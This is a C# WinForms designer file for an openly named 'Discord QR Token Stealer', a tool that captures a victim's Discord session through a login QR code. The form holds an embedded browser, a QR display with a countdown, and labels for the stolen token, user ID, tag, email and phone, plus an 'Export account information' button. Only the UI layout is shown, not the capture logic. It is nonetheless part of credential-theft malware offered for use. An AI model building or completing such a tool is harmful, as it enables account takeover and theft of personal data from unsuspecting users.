
namespace Discord_QR_Token_Stealer
{
    partial class qrGrabber
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.chromiumWebBrowser1 = new CefSharp.WinForms.ChromiumWebBrowser();
            this.listBox2 = new System.Windows.Forms.ListBox();
            this.currentCode = new System.Windows.Forms.PictureBox();
            this.exportInfo = new System.Windows.Forms.Button();
            this.lblToken = new System.Windows.Forms.Label();
            this.lblTag = new System.Windows.Forms.Label();
            this.lblEmail = new System.Windows.Forms.Label();
            this.lblPhone = new System.Windows.Forms.Label();
            this.lblId = new System.Windows.Forms.Label();
            this.lblTimeLeft = new System.Windows.Forms.Label();
            this.reloadPage = new System.Windows.Forms.Button();
            ((System.ComponentModel.ISupportInitialize)(this.currentCode)).BeginInit();
            this.SuspendLayout();
            // 
            // chromiumWebBrowser1
            // 
            this.chromiumWebBrowser1.ActivateBrowserOnCreation = false;
            this.chromiumWebBrowser1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
// TODO: Code generation for '' failed because of Exception 'Invalid Primitive Type: System.IntPtr. Consider using CodeObjectCreateExpression.'.
            this.chromiumWebBrowser1.Location = new System.Drawing.Point(347, 12);
            this.chromiumWebBrowser1.Name = "chromiumWebBrowser1";
            this.chromiumWebBrowser1.Size = new System.Drawing.Size(1251, 666);
            this.chromiumWebBrowser1.TabIndex = 1;
            this.chromiumWebBrowser1.AddressChanged += new System.EventHandler<CefSharp.AddressChangedEventArgs>(this.chromiumWebBrowser1_AddressChanged);
            this.chromiumWebBrowser1.IsBrowserInitializedChanged += new System.EventHandler(this.chromiumWebBrowser1_IsBrowserInitializedChanged);
            // 
            // listBox2
            // 
            this.listBox2.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.listBox2.FormattingEnabled = true;
            this.listBox2.Location = new System.Drawing.Point(347, 684);
            this.listBox2.Name = "listBox2";
            this.listBox2.Size = new System.Drawing.Size(1251, 121);
            this.listBox2.TabIndex = 2;
            // 
            // currentCode
            // 
            this.currentCode.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.currentCode.Location = new System.Drawing.Point(12, 76);
            this.currentCode.Name = "currentCode";
            this.currentCode.Size = new System.Drawing.Size(329, 497);
            this.currentCode.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.currentCode.TabIndex = 3;
            this.currentCode.TabStop = false;
            this.currentCode.Click += new System.EventHandler(this.currentCode_Click);
            // 
            // exportInfo
            // 
            this.exportInfo.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.exportInfo.Location = new System.Drawing.Point(12, 781);
            this.exportInfo.Name = "exportInfo";
            this.exportInfo.Size = new System.Drawing.Size(329, 23);
            this.exportInfo.TabIndex = 4;
            this.exportInfo.Text = "Export account information";
            this.exportInfo.UseVisualStyleBackColor = true;
            this.exportInfo.Click += new System.EventHandler(this.exportInfo_Click);
            // 
            // lblToken
            // 
            this.lblToken.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.lblToken.Location = new System.Drawing.Point(12, 644);
            this.lblToken.Name = "lblToken";
            this.lblToken.Size = new System.Drawing.Size(329, 17);
            this.lblToken.TabIndex = 5;
            this.lblToken.Text = "Token";
            this.lblToken.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.lblToken.Click += new System.EventHandler(this.copyControlText_Click);
            // 
            // lblTag
            // 
            this.lblTag.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.lblTag.Location = new System.Drawing.Point(12, 678);
            this.lblTag.Name = "lblTag";
            this.lblTag.Size = new System.Drawing.Size(329, 17);
            this.lblTag.TabIndex = 6;
            this.lblTag.Text = "Tag";
            this.lblTag.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.lblTag.Click += new System.EventHandler(this.copyControlText_Click);
            // 
            // lblEmail
            // 
            this.lblEmail.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.lblEmail.Location = new System.Drawing.Point(12, 695);
            this.lblEmail.Name = "lblEmail";
            this.lblEmail.Size = new System.Drawing.Size(329, 17);
            this.lblEmail.TabIndex = 7;
            this.lblEmail.Text = "Email";
            this.lblEmail.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.lblEmail.Click += new System.EventHandler(this.copyControlText_Click);
            // 
            // lblPhone
            // 
            this.lblPhone.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.lblPhone.Location = new System.Drawing.Point(12, 712);
            this.lblPhone.Name = "lblPhone";
            this.lblPhone.Size = new System.Drawing.Size(329, 17);
            this.lblPhone.TabIndex = 8;
            this.lblPhone.Text = "Phone";
            this.lblPhone.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.lblPhone.Click += new System.EventHandler(this.copyControlText_Click);
            // 
            // lblId
            // 
            this.lblId.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.lblId.Location = new System.Drawing.Point(12, 661);
            this.lblId.Name = "lblId";
            this.lblId.Size = new System.Drawing.Size(329, 17);
            this.lblId.TabIndex = 9;
            this.lblId.Text = "User ID";
            this.lblId.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            this.lblId.Click += new System.EventHandler(this.copyControlText_Click);
            // 
            // lblTimeLeft
            // 
            this.lblTimeLeft.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.lblTimeLeft.Location = new System.Drawing.Point(12, 50);
            this.lblTimeLeft.Name = "lblTimeLeft";
            this.lblTimeLeft.Size = new System.Drawing.Size(329, 23);
            this.lblTimeLeft.TabIndex = 10;
            this.lblTimeLeft.Text = "Time left";
            this.lblTimeLeft.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
            // 
            // reloadPage
            // 
            this.reloadPage.Location = new System.Drawing.Point(12, 752);
            this.reloadPage.Name = "reloadPage";
            this.reloadPage.Size = new System.Drawing.Size(329, 23);
            this.reloadPage.TabIndex = 11;
            this.reloadPage.Text = "Reload page";
            this.reloadPage.UseVisualStyleBackColor = true;
            this.reloadPage.Click += new System.EventHandler(this.reloadPage_Click);
            // 
            // qrGrabber
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1610, 816);
            this.Controls.Add(this.reloadPage);
            this.Controls.Add(this.lblTimeLeft);
            this.Controls.Add(this.lblId);
            this.Controls.Add(this.lblPhone);
            this.Controls.Add(this.lblEmail);
            this.Controls.Add(this.lblTag);
            this.Controls.Add(this.lblToken);
            this.Controls.Add(this.exportInfo);
            this.Controls.Add(this.currentCode);
            this.Controls.Add(this.listBox2);
            this.Controls.Add(this.chromiumWebBrowser1);
            this.Name = "qrGrabber";
            this.Text = "QR Code Token Grabber by verlox#0001";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.qrGrabber_FormClosing);
            this.Load += new System.EventHandler(this.qrGrabber_Load);
            ((System.ComponentModel.ISupportInitialize)(this.currentCode)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion
        private CefSharp.WinForms.ChromiumWebBrowser chromiumWebBrowser1;
        private System.Windows.Forms.ListBox listBox2;
        private System.Windows.Forms.PictureBox currentCode;
        private System.Windows.Forms.Button exportInfo;
        private System.Windows.Forms.Label lblToken;
        private System.Windows.Forms.Label lblTag;
        private System.Windows.Forms.Label lblEmail;
        private System.Windows.Forms.Label lblPhone;
        private System.Windows.Forms.Label lblId;
        private System.Windows.Forms.Label lblTimeLeft;
        private System.Windows.Forms.Button reloadPage;
    }
}

